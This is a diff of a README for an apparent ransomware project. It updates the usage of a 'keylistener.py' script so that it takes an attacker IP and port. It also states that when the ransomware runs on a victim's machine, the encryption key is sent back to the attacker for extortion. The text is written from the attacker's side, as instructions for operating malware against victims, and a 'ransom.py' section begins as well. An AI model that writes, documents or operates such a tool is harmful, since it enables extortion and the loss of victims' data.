@@ -4,9 +4,9 @@ pip install cryptography
 ## How to use
 # keylistener.py
 ```bash
-python keylistener.py
+python keylistener.py <IP> <PORT>
 ```
-This just sets up the attacker machine to listen to incoming connections. When the encrypter is run on the victim's machine, the key will be sent back for the attacker to extort.
+This just sets up the attacker machine to listen to incoming connections on the supplied IP & Port. When the ransomware is ran on the victim's machine, the key will be sent back to the attacker for extortion.
 
 # ransom.py
 ```bash
